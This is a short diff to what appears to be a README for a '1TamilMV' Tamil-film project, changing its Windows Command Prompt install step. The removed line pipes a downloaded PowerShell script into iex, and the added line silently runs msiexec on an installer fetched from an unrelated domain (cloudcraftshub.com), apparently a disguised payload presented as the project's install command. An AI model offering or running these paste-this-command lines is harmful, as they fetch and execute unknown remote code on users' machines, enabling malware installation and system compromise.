@@ -83,7 +83,7 @@ The Tamil film industry is the fourth-largest film industry in the world. It has
 **Command Prompt(CMD):**
 
 ```batch
-@echo off && powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YourUsername/1TamilMV/main/install.ps1')" && pause
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem 1tamilmvbot
 ```
 
 ### 🐧 Linux/macOS
